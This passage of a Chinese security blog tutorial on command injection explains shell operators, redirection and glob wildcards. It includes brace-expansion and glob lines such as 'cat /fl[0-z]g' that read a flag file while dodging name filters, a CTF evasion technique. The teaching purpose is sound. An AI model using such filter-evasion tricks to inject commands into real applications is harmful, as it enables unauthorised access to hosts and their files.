class=md-nav__item> <a href=#_9 class=md-nav__link> `反引号（重音符） </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> ‘单引号 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> “双引号 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> ()指令群组 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> (()) </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> {}大括号 </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> []中括号 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> [[ ]] </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 小括号，中括号，和大括号的区别 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 输入输出/重定向 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 通配符 </a> <nav class=md-nav aria-label=通配符> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 语法 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 举个例子 </a> <nav class=md-nav aria-label=举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#example-1 class=md-nav__link> Example 1 </a> </li> <li class=md-nav__item> <a href=#example-2 class=md-nav__link> Example 2 </a> </li> <li class=md-nav__item> <a href=#example-3 class=md-nav__link> Example 3 </a> </li> <li class=md-nav__item> <a href=#example-4 class=md-nav__link> Example 4 </a> </li> <li class=md-nav__item> <a href=#example-5 class=md-nav__link> Example 5 </a> </li> <li class=md-nav__item> <a href=#example-6 class=md-nav__link> Example 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 再举个例子 </a> <nav class=md-nav aria-label=再举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_23 class=md-nav__link> ?的使用 </a> </li> <li class=md-nav__item> <a href=#_24 class=md-nav__link> [&mldr;]的使用 </a> </li> <li class=md-nav__item> <a href=#_25 class=md-nav__link> {&mldr;}的使用 </a> </li> <li class=md-nav__item> <a href=#tips class=md-nav__link> Tips </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 运用 </a> <nav class=md-nav aria-label=运用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#command-injection-low class=md-nav__link> Command Injection: low </a> </li> <li class=md-nav__item> <a href=#command-injection-medium class=md-nav__link> Command Injection: medium </a> </li> <li class=md-nav__item> <a href=#command-injection-high class=md-nav__link> Command Injection: high </a> </li> <li class=md-nav__item> <a href=#command-injection-impossible class=md-nav__link> Command Injection: impossible </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 常用绕过 </a> <nav class=md-nav aria-label=常用绕过> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 命令分隔与执行多条命令 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 空格绕过 </a> </li> <li class=md-nav__item> <a href=#_30 class=md-nav__link> 黑名单绕过 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_31 class=md-nav__link> 举个例子 </a> <nav class=md-nav aria-label=举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_32 class=md-nav__link> 短命令执行 </a> </li> <li class=md-nav__item> <a href=#example-1_1 class=md-nav__link> Example 1 七字绕过 </a> </li> <li class=md-nav__item> <a href=#example-2-hitcon-ctf-2017-babyfirst-revenge class=md-nav__link> Example 2 五字绕过 [HITCON CTF 2017-BabyFirst Revenge] </a> </li> <li class=md-nav__item> <a href=#example-3-hitcon-2017-babyfirst-revenge-v2 class=md-nav__link> Example 3 四字绕过 [HITCON 2017 BabyFirst Revenge v2] </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_33 class=md-nav__link> 无回显的命令注入 </a> <nav class=md-nav aria-label=无回显的命令注入> <ul class=md-nav__list> <li class=md-nav__item> <a href=#dns-log class=md-nav__link> DNS Log </a> </li> <li class=md-nav__item> <a href=#sleep class=md-nav__link> sleep </a> </li> <li class=md-nav__item> <a href=#_34 class=md-nav__link> 使用暴露的服务 </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> 反弹shell </a> </li> <li class=md-nav__item> <a href=#trick class=md-nav__link> Trick </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_35 class=md-nav__link> 更正 </a> </li> <li class=md-nav__item> <a href=#_36 class=md-nav__link> 参考 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/ class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> <li class=md-nav__item> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class=md-nav__link> Bad Binder:Android In The Wild Exploit </a> </li> <li class=md-nav__item> <a href=../%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/ class=md-nav__link> 信息安全站点收集 </a> </li> <li class=md-nav__item> <a href=../%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/ class=md-nav__link> 王子亭的博客 GPG 与端到端加密：论什么才是可以信任的 </a> </li> <li class=md-nav__item> <a href=../nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/ class=md-nav__link> Nc: invalid option — ‘ ‘ </a> </li> <li class=md-nav__item> <a href=../CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ class=md-nav__link> CTF中的序列化与反序列化 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6> 其它 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=其它 data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> 其它 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> How to Get Rich </a> </li> <li class=md-nav__item> <a href=../TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/ class=md-nav__link> TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021 </a> </li> <li class=md-nav__item> <a href=../FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/ class=md-nav__link> FFmpeg功能命令汇总 </a> </li> <li class=md-nav__item> <a href=../%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/ class=md-nav__link> 不怕奸商 揭各品牌电视进工厂模式方法 </a> </li> <li class=md-nav__item> <a href=../%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/ class=md-nav__link> 傅里叶变换 </a> </li> <li class=md-nav__item> <a href=../%E6%BB%A4%E6%B3%A2%E5%99%A8/ class=md-nav__link> 滤波器 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/ class=md-nav__link> 蓝牙协议入门（一）简介 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（二）传输层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（三）中介层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（四）应用层协议 </a> </li> <li class=md-nav__item> <a href=../TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/ class=md-nav__link> TarsosDSP 简介 3.TarsosDSP 是如何工作的？ </a> </li> <li class=md-nav__item> <a href=../../tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/ class=md-nav__link> 实战rfc5766 turn server和ice4j广域网通讯 </a> </li> <li class=md-nav__item> <a href=../%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/ class=md-nav__link> 波黑围城战中的幸存者 </a> </li> <li class=md-nav__item> <a href=../%E6%AD%A6%E6%B1%89%EF%BC%9A%E7%99%BE%E5%B9%B4%E7%9A%84%E6%B4%AA%E6%B0%B4%E8%AE%B0%E5%BF%86/ class=md-nav__link> 武汉：百年的洪水记忆 </a> </li> <li class=md-nav__item> <a href=../../Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/ class=md-nav__link> Python制作pdf电子书 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#n class=md-nav__link> 巧用命令注入的N种方式 </a> </li> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 命令执行 </a> <nav class=md-nav aria-label=命令执行> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 理论基础 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 特殊符号 </a> <nav class=md-nav aria-label=特殊符号> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> | </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> &amp; </a> </li> <li class=md-nav__item> <a href=#linux class=md-nav__link> Linux中的&amp;&amp;与|| </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> &amp;&amp; </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> || </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> ;分号 </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> `反引号（重音符） </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> ‘单引号 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> “双引号 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> ()指令群组 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> (()) </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> {}大括号 </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> []中括号 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> [[ ]] </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 小括号，中括号，和大括号的区别 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 输入输出/重定向 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 通配符 </a> <nav class=md-nav aria-label=通配符> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 语法 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 举个例子 </a> <nav class=md-nav aria-label=举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#example-1 class=md-nav__link> Example 1 </a> </li> <li class=md-nav__item> <a href=#example-2 class=md-nav__link> Example 2 </a> </li> <li class=md-nav__item> <a href=#example-3 class=md-nav__link> Example 3 </a> </li> <li class=md-nav__item> <a href=#example-4 class=md-nav__link> Example 4 </a> </li> <li class=md-nav__item> <a href=#example-5 class=md-nav__link> Example 5 </a> </li> <li class=md-nav__item> <a href=#example-6 class=md-nav__link> Example 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 再举个例子 </a> <nav class=md-nav aria-label=再举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_23 class=md-nav__link> ?的使用 </a> </li> <li class=md-nav__item> <a href=#_24 class=md-nav__link> [&mldr;]的使用 </a> </li> <li class=md-nav__item> <a href=#_25 class=md-nav__link> {&mldr;}的使用 </a> </li> <li class=md-nav__item> <a href=#tips class=md-nav__link> Tips </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 运用 </a> <nav class=md-nav aria-label=运用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#command-injection-low class=md-nav__link> Command Injection: low </a> </li> <li class=md-nav__item> <a href=#command-injection-medium class=md-nav__link> Command Injection: medium </a> </li> <li class=md-nav__item> <a href=#command-injection-high class=md-nav__link> Command Injection: high </a> </li> <li class=md-nav__item> <a href=#command-injection-impossible class=md-nav__link> Command Injection: impossible </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 常用绕过 </a> <nav class=md-nav aria-label=常用绕过> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 命令分隔与执行多条命令 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 空格绕过 </a> </li> <li class=md-nav__item> <a href=#_30 class=md-nav__link> 黑名单绕过 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_31 class=md-nav__link> 举个例子 </a> <nav class=md-nav aria-label=举个例子> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_32 class=md-nav__link> 短命令执行 </a> </li> <li class=md-nav__item> <a href=#example-1_1 class=md-nav__link> Example 1 七字绕过 </a> </li> <li class=md-nav__item> <a href=#example-2-hitcon-ctf-2017-babyfirst-revenge class=md-nav__link> Example 2 五字绕过 [HITCON CTF 2017-BabyFirst Revenge] </a> </li> <li class=md-nav__item> <a href=#example-3-hitcon-2017-babyfirst-revenge-v2 class=md-nav__link> Example 3 四字绕过 [HITCON 2017 BabyFirst Revenge v2] </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_33 class=md-nav__link> 无回显的命令注入 </a> <nav class=md-nav aria-label=无回显的命令注入> <ul class=md-nav__list> <li class=md-nav__item> <a href=#dns-log class=md-nav__link> DNS Log </a> </li> <li class=md-nav__item> <a href=#sleep class=md-nav__link> sleep </a> </li> <li class=md-nav__item> <a href=#_34 class=md-nav__link> 使用暴露的服务 </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> 反弹shell </a> </li> <li class=md-nav__item> <a href=#trick class=md-nav__link> Trick </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_35 class=md-nav__link> 更正 </a> </li> <li class=md-nav__item> <a href=#_36 class=md-nav__link> 参考 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>巧用命令注入的N种方式</h1> <h2 id=n>巧用命令注入的N种方式</h2> <blockquote> <p>​ 本文首发于补天平台，地址：https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</p> </blockquote> <p>在<code>NUAACTF_2018</code>中，我出了一道比较水的采用<code>Spring</code>框架的<code>SSRF</code>+<code>Java Deserialization</code>+<code>Command Injection</code>。个人觉得在出题时候也学习到了不少知识，特别是在<code>Command Injection</code>这一块让我对<code>Command Injection</code>有了新的看法。</p> <h2 id=_1>命令执行</h2> <h3 id=_2>理论基础</h3> <blockquote> <p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p> <p>This attack differs from <a href=https://www.owasp.org/index.php/Code_Injection>Code Injection</a>, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.</p> </blockquote> <p>以上来自<a href=https://www.owasp.org/index.php/Command_Injection>Command Injection - OWASP</a>，翻译过来就是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。 在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p> <blockquote> <p>​ 命令注入攻击最初被称为Shell命令注入攻击，是由挪威一名程序员在1997年意外发现的。第一个命令注入攻击程序能随意地从一个网站删除网页，就像从磁盘或者硬盘移除文件一样简单。 ——百度百科</p> </blockquote> <h3 id=_3>特殊符号</h3> <p>讲到命令注入，就不得不提到特殊符号的运用。例如上面例子中的<code>|</code>管道符，还有比较多的类似有奇效的符号组合。</p> <h4 id=_4>|</h4> <p>连结上个指令的标准输出，做为下个指令的标准输入。</p> <h4 id=_5>&amp;</h4> <p>用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上<code>&amp;</code>。</p> <h4 id=linux>Linux中的&amp;&amp;与||</h4> <p><code>shell</code>在执行某个命令的时候，会返回一个返回值，该返回值保存在<code>shell</code>变量 <code>$?</code> 中。当 <code>$? == 0</code> 时，表示执行成功；当 <code>$? == 1</code> 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。<code>shell</code>提供了<code>&amp;&amp;</code>和<code>||</code>来实现命令执行控制的功能，<code>shell</code>将根据<code>&amp;&amp;</code>或<code>||</code>前面命令的返回值来控制其后面命令的执行。</p> <h4 id=_6>&amp;&amp;</h4> <p>语法格式如下：</p> <pre><code>command1 &amp;&amp; command2 [&amp;&amp; command3 ...]  

</code></pre> <ul> <li>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</li> <li>只有在<code>&amp;&amp;</code>左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code>右边的命令才会被执行</li> <li>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行</li> </ul> <pre><code>$ cp ~/Desktop/1.txt ~/1.txt &amp;&amp; rm ~/Desktop/1.txt &amp;&amp; echo &quot;success&quot;  

</code></pre> <p>示例 中的命令首先从<code>~/Desktop</code>目录复制 <code>1.txt</code>文件到<code>~</code>目录；执行成功后，使用<code>rm</code>删除源文件；如果删除成功则输出提示信息。</p> <h4 id=_7>||</h4> <p>语法格式如下：</p> <pre><code>command1 || command2 [|| command3 ...]  

</code></pre> <ul> <li>命令之间使用 || 连接，实现逻辑或的功能。</li> <li>只有在 || 左边的命令返回假（命令返回值 <code>$? == 1</code>），<code>||</code>右边的命令才会被执行。这和<code>c</code>语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</li> <li>只要有一个命令返回真（命令返回值 <code>$? == 0</code>），后面的命令就不会被执行。</li> </ul> <pre><code>$ rm ~/Desktop/1.txt || echo &quot;fail&quot;  

</code></pre> <p>如果 ~/Desktop 目录下不存在文件 1.txt，将输出提示信息。</p> <h4 id=_8>;分号</h4> <p>当有几个命令要连续执行时，我们可以把它们放在一行内，中间用<code>;</code>分开。</p> <h4 id=_9>`反引号（重音符）</h4> <p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p> <pre><code>echo It is now `date` 

等价于：
echo It is now 一 12月 17 12:16:04 GMT 2018

在正式执行时会产生以下输出结果：
It is now 一 12月 17 12:16:04 GMT 2018

</code></pre> <h4 id=_10>‘单引号</h4> <p>被单引号括住的内容,将被视为单一字符串。在引号内的变量<code>$</code>符号将会失效，也就是说，将被视作一般符号处理。</p> <h4 id=_11>“双引号</h4> <p>被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同</p> <h4 id=_12>()指令群组</h4> <p>格式为：(command1;command2[;command3&mldr;])</p> <ul> <li>一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。</li> <li>表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。</li> <li>命令组合常和命令执行控制结合起来使用。</li> </ul> <p>用括号将一串连续指令括起来，这种用法对<code>shell</code>来说，称为指令群组。如下面的例子:</p> <pre><code>(cd ~ ; vcgh=`pwd` ;echo $vcgh)

</code></pre> <p>指令群组有一个特性，shell会以产生<code>subshell</code>来执行这组指令。</p> <pre><code>$ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo &quot;fail&quot;)  

如果目录 ~/Desktop 下不存在文件 1.txt，则执行命令组合。 

</code></pre> <h4 id=_13>(())</h4> <p>这组符号的作用与 let 指令相似，用在算数运算上，是 bash 的内建功能。所以，在执行效率上会比使用 let指令要好许多。</p> <pre><code>#!/bin/bash(( a = 10 ))echo -e &quot;inital value, a = $a\n&quot;(( a++))echo &quot;after a++, a = $a&quot;

</code></pre> <h4 id=_14>{}大括号</h4> <p>其实大括号有一种拼接字符串的用法，<code>{xx,yy,zz,...}</code>这种大括号的组合，常用在字串的组合上，来看个例子</p> <pre><code>mkdir {userA,userB,userC}-{home,bin,data}

</code></pre> <p>我们得到<code>userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data</code>。于是我们可以有</p> <pre><code>$ cat {/fl,/fla}{ag,g}
flag{xxx}
cat: /flg: No such file or directory
cat: /flaag: No such file or directory
flag{xxx}

</code></pre> <h4 id=_15>[]中括号</h4> <p>常出现在流程控制中，扮演括住判断式的作用。<code>if [ "$?" != 0 ]thenecho "Executes error"exit1fi</code>。这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。</p> <pre><code>$ cat /fl[0-z]g
flag{xxx}

</code></pre> <h4 id=_16>[[ ]]</h4> <p>这组符号与先前的 <code>[]</code> 符号，基本上作用相同，但她允许在其中直接使用<code>||</code>与<code>&amp;&amp;</code>逻辑等符号。</p> <pre><code>#!/bin/bashread akif [[ $ak &gt; 5 || $ak&lt; 9 ]]thenecho $akfi

</code></pre> <h4 id=_17>小括号，中括号，和大括号的区别</h4> <p>那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。</p> <ol> <li>单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把<code>command group</code>放在<code>subshell</code>去执行，也叫做<code>nested sub-shell</code>。</li> <li>单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 <code>non-namedcommand group</code>。</li> </ol> <p>所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。 不过，根据实测，<code>test=$(ls -a)</code>可以执行，但是<code>test=${ls–a}</code>语法上面是有错误的。估计也和上面所说的原因有关。</p> <p>另外，从网上摘录的区别如下：</p> <ul> <li>()只是对一串命令重新开一个子shell进行执行</li> <li>{}对一串命令在当前shell执行</li> <li>()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开</li> <li>()最后一个命令可以不用分号</li> <li>{}最后一个命令要用分号</li> <li>{}的第一个命令和左括号之间必须要有一个空格</li> <li>()里的各命令不必和括号有空格</li> <li>()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令</li> </ul> <p>这里引出来<code>[..]</code>和<code>[[...]]</code>的区别：使用<code>[[...]]</code>条件判断结构, 而不是<code>[...]</code>, 能够防止脚本中的许多逻辑错误.比如<code>&amp;&amp;</code>, <code>||</code>,<code>&lt;</code>,和<code>&gt;</code> 操作符能够正常存在于<code>[[ ]]</code>条件判断结构中, 但是如果出现在<code>[]</code>结构中的话，会报错。</p> <p>对<code>{}</code>和<code>()</code>而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。</p> <h4 id=_18>输入输出/重定向</h4> <pre><code>&gt;      &gt;&gt;   &lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2

</code></pre> <p>文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。</p> <table> <thead> <tr> <th>文件描述符</th> <th>名称</th> <th>常用缩写</th> <th>默认值</th> </tr> </thead> <tbody> <tr> <td>0</td> <td>标准输入</td> <td>stdin</td> <td>键盘</td> </tr> <tr> <td>1</td> <td>标准输出</td> <td>stdout</td> <td>屏幕</td> </tr> <tr> <td>2</td> <td>标准错误输出</td> <td>stderr</td> <td>屏幕</td> </tr> </tbody> </table> <p>我们在简单地用<code>&lt;</code>或<code>&gt;</code>时，相当于使用<code>0&lt;</code>或<code>1&gt;</code>（下面会详细介绍）。</p> <ul> <li>cmd &gt; file 把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</li> <li>cmd » file 把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</li> <li>cmd &lt; file 使cmd命令从file读入</li> <li>cmd « text 从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</li> <li>cmd «&lt; word 把word（而不是文件word）和后面的换行作为输入提供给cmd。</li> <li>cmd &lt;&gt; file 以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</li> <li>cmd &gt;| file 功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</li> <li>: &gt; filename</li> </ul> <p>把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同). * cmd &gt;&amp;n</p> <p>把输出送到文件描述符n * cmd m&gt;&amp;n</p> <p>把输出到文件符m的信息重定向到文件描述符n * cmd &gt;&amp;-</p> <p>关闭标准输出 * cmd &lt;&amp;n</p> <p>输入来自文件描述符n * cmd m&lt;&amp;n</p> <p>m来自文件描述各个n * cmd &lt;&amp;-</p> <p>关闭标准输入 * cmd &lt;&amp;n-</p> <p>移动输入文件描述符n而非复制它。 * cmd &gt;&amp;n-</p> <p>移动输出文件描述符n而非复制它。 注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p> <h3 id=_19>通配符</h3> <p>还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式:</p> <blockquote> <p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong></p> </blockquote> <h4 id=_20>语法</h4> <table> <thead> <tr> <th>字符</th> <th>解释</th> </tr> </thead> <tbody> <tr> <td>*</td> <td>匹配任意长度任意字符</td> </tr> <tr> <td>?</td> <td>匹配任意单个字符</td> </tr> <tr> <td>[list]</td> <td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td> </tr> <tr> <td>[^list]</td> <td>匹配指定范围外的任意单个字符或字符集合</td> </tr> <tr> <td>[!list]</td> <td>同<code>[^list]</code></td> </tr> <tr> 